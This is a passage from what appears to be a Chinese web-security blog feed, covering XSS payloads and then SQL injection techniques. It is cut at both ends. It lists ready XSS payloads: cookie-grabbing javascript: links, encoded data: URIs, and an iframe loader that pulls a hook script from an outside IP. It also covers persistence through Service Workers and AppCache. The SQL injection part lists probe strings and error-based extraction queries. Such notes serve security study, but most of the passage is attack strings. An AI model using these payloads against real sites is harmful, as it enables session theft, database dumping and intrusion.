&amp;lt;STYLE&amp;gt;@import&#39;http://ha.ckers.org/xss.css&#39;;&amp;lt;/STYLE&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;markdown&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#markdown&#34;&gt;#&lt;/a&gt; markdown&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;[a](javascript:prompt(document.cookie))
[a](j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))
&amp;lt;&amp;amp;#x6A&amp;amp;#x61&amp;amp;#x76&amp;amp;#x61&amp;amp;#x73&amp;amp;#x63&amp;amp;#x72&amp;amp;#x69&amp;amp;#x70&amp;amp;#x74&amp;amp;#x3A&amp;amp;#x61&amp;amp;#x6C&amp;amp;#x65&amp;amp;#x72&amp;amp;#x74&amp;amp;#x28&amp;amp;#x27&amp;amp;#x58&amp;amp;#x53&amp;amp;#x53&amp;amp;#x27&amp;amp;#x29&amp;gt;
![a&#39;&amp;quot;`onerror=prompt(document.cookie)](x)
[notmalicious](javascript:window.onerror=alert;throw%20document.cookie)
[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=)
![a](data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=)
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;iframe-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#iframe-2&#34;&gt;#&lt;/a&gt; iframe&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;iframe onload=&#39;
    var sc   = document.createElement(&amp;quot;scr&amp;quot; + &amp;quot;ipt&amp;quot;);
    sc.type  = &amp;quot;text/javascr&amp;quot; + &amp;quot;ipt&amp;quot;;
    sc.src   = &amp;quot;http://1.2.3.4/js/hook.js&amp;quot;;
    document.body.appendChild(sc);
    &#39;
/&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;iframe src=javascript:alert(1)&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;iframe src=&amp;quot;data:text/html,&amp;lt;iframe src=javascript:alert(&#39;M&#39;)&amp;gt;&amp;lt;/iframe&amp;gt;&amp;quot;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;iframe src=data:text/html;base64,PGlmcmFtZSBzcmM9amF2YXNjcmlwdDphbGVydCgiTWFubml4Iik+PC9pZnJhbWU+&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;iframe srcdoc=&amp;lt;svg/onload=alert(1)&amp;gt;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;iframe src=https://baidu.com width=1366 height=768&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;iframe src=javascript:alert(1) width=1366 height=768&amp;gt;&amp;lt;/iframe&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;form&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#form&#34;&gt;#&lt;/a&gt; form&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;form action=javascript:alert(1)&amp;gt;&amp;lt;input type=submit&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;form&amp;gt;&amp;lt;button formaction=javascript:alert(1)&amp;gt;M&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;form&amp;gt;&amp;lt;input formaction=javascript:alert(1) type=submit value=M&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;form&amp;gt;&amp;lt;input formaction=javascript:alert(1) type=image value=M&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;form&amp;gt;&amp;lt;input formaction=javascript:alert(1) type=image src=1&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;meta&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#meta&#34;&gt;#&lt;/a&gt; meta&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;META HTTP-EQUIV=&amp;quot;Link&amp;quot; Content=&amp;quot;&amp;lt;http://ha.ckers.org/xss.css&amp;gt;; REL=stylesheet&amp;quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;持久化&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#持久化&#34;&gt;#&lt;/a&gt; 持久化&lt;/h1&gt;
&lt;h2 id=&#34;基于存储&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#基于存储&#34;&gt;#&lt;/a&gt; 基于存储&lt;/h2&gt;
&lt;p&gt;有时候网站会将信息存储在 Cookie 或 localStorage，而因为这些数据一般是网站主动存储的，很多时候没有对 Cookie 或 localStorage 中取出的数据做过滤，会直接将其取出并展示在页面中，甚至存了 JSON 格式的数据时，部分站点存在  &lt;code&gt;eval(data)&lt;/code&gt;  之类的调用。因此当有一个 XSS 时，可以把 payload 写入其中，在对应条件下触发。&lt;/p&gt;
&lt;p&gt;在一些条件下，这种利用方式可能因为一些特殊字符造成问题，可以使用  &lt;code&gt;String.fromCharCode&lt;/code&gt;  来绕过。&lt;/p&gt;
&lt;h2 id=&#34;service-worker&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#service-worker&#34;&gt;#&lt;/a&gt; Service Worker&lt;/h2&gt;
&lt;p&gt;Service Worker 可以拦截 http 请求，起到类似本地代理的作用，故可以使用 Service Worker Hook 一些请求，在请求中返回攻击代码，以实现持久化攻击的目的。&lt;/p&gt;
&lt;p&gt;在 Chrome 中，可通过  &lt;code&gt;chrome://inspect/#service-workers&lt;/code&gt;  来查看 Service Worker 的状态，并进行停止。&lt;/p&gt;
&lt;h2 id=&#34;appcache&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#appcache&#34;&gt;#&lt;/a&gt; AppCache&lt;/h2&gt;
&lt;p&gt;在可控的网络环境下（公共 wifi），可以使用 AppCache 机制，来强制存储一些 Payload，未清除的情况下，用户访问站点时对应的 payload 会一直存在。&lt;/p&gt;
&lt;h1 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h1&gt;
&lt;h2 id=&#34;wiki&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#wiki&#34;&gt;#&lt;/a&gt; wiki&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1VsdGltYXRlSGFja2Vycy9Bd2Vzb21lWFNT&#34;&gt;AwesomeXSS&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93M2MuZ2l0aHViLmlvL3dlYmFwcHNlYy1jc3Av&#34;&gt;w3c&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3dpc2VjL2RvbXhzc3dpa2kvd2lraQ==&#34;&gt;dom xss wiki&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jb250ZW50LXNlY3VyaXR5LXBvbGljeS5jb20v&#34;&gt;content-security-policy.com&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zaHVicy5pby9leHBsb2l0aW5nLW1hcmtkb3duLXN5bnRheC1hbmQtdGVsZXNjb3BlLXBlcnNpc3RlbnQteHNzLXRocm91Z2gtbWFya2Rvd24tY3ZlLTIwMTQtNTE0NC8=&#34;&gt;markdwon xss&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9icnV0ZWxvZ2ljLmNvbS5ici9ibG9nL2NoZWF0LXNoZWV0Lw==&#34;&gt;xss cheat sheet&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9odG1sNXNlYy5vcmcv&#34;&gt;html5 security cheatsheet&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cubmV0c3Bhcmtlci5jb20vd2hpdGVwYXBlci1odHRwLXNlY3VyaXR5LWhlYWRlcnMv&#34;&gt;http security headers&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2N1cmU1My9YU1NDaGFsbGVuZ2VXaWtpL3dpa2k=&#34;&gt;XSSChallengeWiki&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;challenges&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#challenges&#34;&gt;#&lt;/a&gt; Challenges&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94c3MtZ2FtZS5hcHBzcG90LmNvbS8=&#34;&gt;XSS Challenge By Google&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3Byb21wdC5tbC8w&#34;&gt;prompt to win&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;css-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#css-2&#34;&gt;#&lt;/a&gt; CSS&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy50aGVzcGFubmVyLmNvLnVrLzIwMTQvMDMvMjEvcnBvLw==&#34;&gt;rpo&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy56amljbWlzYS5vcmcvaW5kZXgucGhwL2FyY2hpdmVzLzEyNy8=&#34;&gt;rpo 攻击初探&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jdXJlc2VjLmNvbS9ibG9nL2FydGljbGUvYmxvZy9SZWFkaW5nLURhdGEtdmlhLUNTUy1JbmplY3Rpb24tMTgwLmh0bWw=&#34;&gt;Reading Data via CSS&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL21rc2Jlbi5sMC5jbS8yMDE1LzEwL2Nzcy1iYXNlZC1hdHRhY2stYWJ1c2luZy11bmljb2RlLXJhbmdlLmh0bWw=&#34;&gt;css based attack abusing unicode range&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zcGVha2VyZGVjay5jb20vbG10X3N3YWxsb3cvY3NzLWluamVjdGlvbi1wbHVzLXBsdXMtamktY3VuLXNob3UtZmEtZmFsc2VnYWktZ3Vhbi10b2R1aS1jZQ==&#34;&gt;css injection&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLnNoZWRkb3cueHl6L2Nzcy10aW1pbmctYXR0YWNrLw==&#34;&gt;css timing attack&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;同源策略-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#同源策略-2&#34;&gt;#&lt;/a&gt; 同源策略&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvZW4tVVMvZG9jcy9XZWIvU2VjdXJpdHkvU2FtZS1vcmlnaW5fcG9saWN5&#34;&gt;Same origin policy&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuYmVkZWZlbmRlZC5jb20vcGFwZXJzL2NvcnMtc2VjdXJpdHktZ3VpZGU=&#34;&gt;cors security guide&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zcGVha2VyZGVjay5jb20vc2hobmprL2xvZ2ljYWxseS1ieXBhc3NpbmctYnJvd3Nlci1zZWN1cml0eS1ib3VuZGFyaWVz&#34;&gt;logically bypassing browser security boundaries&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;bypass-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#bypass-2&#34;&gt;#&lt;/a&gt; bypass&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vSm9oYW5uZXNIb3BwZS81NjEyMjc0&#34;&gt;666 lines of xss payload&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL21hc2F0b2tpbnVnYXdhL2ZpbHRlcmJ5cGFzcw==&#34;&gt;xss auditor bypass&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vSFRNTC9jaHJvbWUteHNzLWF1ZGl0b3ItYnlwYXNzLWNvbGxlY3Rpb24uaHRtbA==&#34;&gt;xss auditor bypass writeup&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvYmxvZy9ieXBhc3NpbmctY3NwLXVzaW5nLXBvbHlnbG90LWpwZWdz&#34;&gt;bypassing csp using polyglot jpegs&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuc2VjanVpY2UuY29tL2J5cGFzcy14c3MtZmlsdGVycy11c2luZy1qYXZhc2NyaXB0LWdsb2JhbC12YXJpYWJsZXMv&#34;&gt;bypass xss filters using javascript global variables&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;持久化-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#持久化-2&#34;&gt;#&lt;/a&gt; 持久化&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2Ryb3BzLndvb3l1bi5vcmcvd2ViLzEwNzk4&#34;&gt;变种 XSS 持久控制 by tig3r&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zYWt1cml0eS5jb20vYmxvZy8yMDE1LzA4LzEzL21pZGRsZWtpdC5odG1s&#34;&gt;Using Appcache and ServiceWorker for Evil&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;tricks&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#tricks&#34;&gt;#&lt;/a&gt; Tricks&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2V0aGVyZHJlYW0vc3ctc2Vj&#34;&gt;Service Worker 安全探索&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0V0aGVyRHJlYW0vd2ViLWZyb250ZW5kLW1hZ2lj&#34;&gt;前端黑魔法&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/SQL/</guid>
            <title>SQL注入</title>
            <link>https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/SQL/</link>
            <category>网络安全</category>
            <category>漏洞</category>
            <category>SQL注入</category>
            <pubDate>Sat, 26 Nov 2022 11:05:09 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;注入分类&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#注入分类&#34;&gt;#&lt;/a&gt; 注入分类&lt;/h1&gt;
&lt;h2 id=&#34;简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介&#34;&gt;#&lt;/a&gt; 简介&lt;/h2&gt;
&lt;p&gt;SQL 注入是一种代码注入技术，用于攻击数据驱动的应用程序。 在应用程序中，如果没有做恰当的过滤，则可能使得恶意的 SQL 语句被插入输入字段中执行（例如将数据库内容转储给攻击者）。&lt;/p&gt;
&lt;h2 id=&#34;按技巧分类&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#按技巧分类&#34;&gt;#&lt;/a&gt; 按技巧分类&lt;/h2&gt;
&lt;p&gt;根据使用的技巧，SQL 注入类型可分为&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;盲注&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;布尔盲注：只能从应用返回中推断语句执行后的布尔值&lt;/li&gt;
&lt;li&gt;时间盲注：应用没有明确的回显，只能使用特定的时间函数来判断&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;报错注入：应用会显示全部或者部分的报错信息&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;堆叠注入：有的应用可以加入  &lt;code&gt;;&lt;/code&gt;  后一次执行多条语句&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;其他&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;按获取数据的方式分类&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#按获取数据的方式分类&#34;&gt;#&lt;/a&gt; 按获取数据的方式分类&lt;/h2&gt;
&lt;p&gt;另外也可以根据获取数据的方式分为 3 类&lt;/p&gt;
&lt;h3 id=&#34;inband&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#inband&#34;&gt;#&lt;/a&gt; inband&lt;/h3&gt;
&lt;p&gt;利用 Web 应用来直接获取数据，如报错注入，这类注入都是通过站点的响应或者错误反馈来提取数据。&lt;/p&gt;
&lt;h3 id=&#34;inference&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#inference&#34;&gt;#&lt;/a&gt; inference&lt;/h3&gt;
&lt;p&gt;通过 Web 的一些反映来推断数据，如布尔盲注，也就是我们通俗的盲注， 通过 web 应用的其他改变来推断数据。&lt;/p&gt;
&lt;h3 id=&#34;out-of-band-oob&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#out-of-band-oob&#34;&gt;#&lt;/a&gt; out of band (OOB)&lt;/h3&gt;
&lt;p&gt;通过其他传输方式来获得数据，比如 DNS 解析协议和电子邮件。&lt;/p&gt;
&lt;h1 id=&#34;注入检测&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#注入检测&#34;&gt;#&lt;/a&gt; 注入检测&lt;/h1&gt;
&lt;h2 id=&#34;常见的注入点&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见的注入点&#34;&gt;#&lt;/a&gt; 常见的注入点&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;GET/POST/PUT/DELETE 参数&lt;/li&gt;
&lt;li&gt;X-Forwarded-For&lt;/li&gt;
&lt;li&gt;文件名&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;fuzz注入点&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#fuzz注入点&#34;&gt;#&lt;/a&gt; Fuzz 注入点&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&#39;&lt;/code&gt;  /  &lt;code&gt;&amp;quot;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;1/1&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;1/0&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;and 1=1&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;quot; and &amp;quot;1&amp;quot;=&amp;quot;1&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;and 1=2&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;or 1=1&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;or 1=&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#39; and &#39;1&#39;=&#39;1&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;+&lt;/code&gt;   &lt;code&gt;-&lt;/code&gt;   &lt;code&gt;^&lt;/code&gt;   &lt;code&gt;*&lt;/code&gt;   &lt;code&gt;%&lt;/code&gt;   &lt;code&gt;/&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;&amp;lt;&lt;/code&gt;   &lt;code&gt;&amp;gt;&amp;gt;&lt;/code&gt;   &lt;code&gt;||&lt;/code&gt;   &lt;code&gt;|&lt;/code&gt;   &lt;code&gt;&amp;amp;&lt;/code&gt;   &lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;~&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;!&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;@&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;反引号执行&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;测试用常量&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#测试用常量&#34;&gt;#&lt;/a&gt; 测试用常量&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;@@version&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;@@servername&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;@@language&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;@@spid&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;测试列数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#测试列数&#34;&gt;#&lt;/a&gt; 测试列数&lt;/h2&gt;
&lt;p&gt;例如  &lt;code&gt;http://www.foo.com/index.asp?id=12+union+select+null,null--&lt;/code&gt;  ，不断增加  &lt;code&gt;null&lt;/code&gt;  至不返回&lt;/p&gt;
&lt;h2 id=&#34;报错注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#报错注入&#34;&gt;#&lt;/a&gt; 报错注入&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;select 1/0&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;extractvalue(1, concat(0x5c,(select user())))&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;updatexml(0x3a,concat(1,(select user())),1)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;exp(~(SELECT * from(select user())a))&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ST_LatFromGeoHash((select * from(select * from(select user())a)b))&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;GTID_SUBSET(version(), 1)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;基于geometric的报错注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#基于geometric的报错注入&#34;&gt;#&lt;/a&gt; 基于 geometric 的报错注入&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;GeometryCollection((select * from (select * from(select user())a)b))&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;polygon((select * from(select * from(select user())a)b))&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;multipoint((select * from(select * from(select user())a)b))&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;multilinestring((select * from(select * from(select user())a)b))&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;LINESTRING((select * from(select * from(select user())a)b))&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;multipolygon((select * from(select * from(select user())a)b))&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;其中需要注意的是，基于 exp 函数的报错注入在 MySQL 5.5.49 后的版本已经不再生效，具体可以参考这个 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL215c3FsL215c3FsLXNlcnZlci9jb21taXQvOTU4MjVmYTI4YTdlODRhMmY1ZGJkZWY1MjQxMDc4ZjcwNTVjNWIwNA==&#34;&gt;commit 95825f&lt;/span&gt; 。&lt;/p&gt;
&lt;p&gt;而以上列表中基于 geometric 的报错注入在这个 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL215c3FsL215c3FsLXNlcnZlci9jb21taXQvNWNhZWE0YTk5NTEzMGNkN2M4MjU3NGFjYzU5MWZmN2M0NmQ5ZDk3OA==&#34;&gt;commit 5caea4&lt;/span&gt; 中被修复，在 5.5.x 较后的版本中同样不再生效。&lt;/p&gt;
&lt;h2 id=&#34;堆叠注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#堆叠注入&#34;&gt;#&lt;/a&gt; 堆叠注入&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;;select 1&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;注释符&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#注释符&#34;&gt;#&lt;/a&gt; 注释符&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;#&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;--+&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/*xxx*/&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/*!xxx*/&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/*!50000xxx*/&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;判断过滤规则&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#判断过滤规则&#34;&gt;#&lt;/a&gt; 判断过滤规则&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;是否有 trunc&lt;/li&gt;
&lt;li&gt;是否过滤某个字符&lt;/li&gt;
&lt;li&gt;是否过滤关键字&lt;/li&gt;
&lt;li&gt;slash 和编码&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;获取信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#获取信息&#34;&gt;#&lt;/a&gt; 获取信息&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;判断数据库类型&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;and exists (select * from msysobjects ) &amp;gt; 0&lt;/code&gt;  access 数据库&lt;/li&gt;
&lt;li&gt;&lt;code&gt;and exists (select * from sysobjects ) &amp;gt; 0&lt;/code&gt;  SQLServer 数据库&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;判断数据库表&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;and exsits (select * from admin)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;版本、主机名、用户名、库名&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;表和字段&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;确定字段数&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Order By&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Select Into&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;表名、列名&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;测试权限&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#测试权限&#34;&gt;#&lt;/a&gt; 测试权限&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;文件操作
&lt;ul&gt;
&lt;li&gt;读敏感文件&lt;/li&gt;
&lt;li&gt;写 shell&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;带外通道
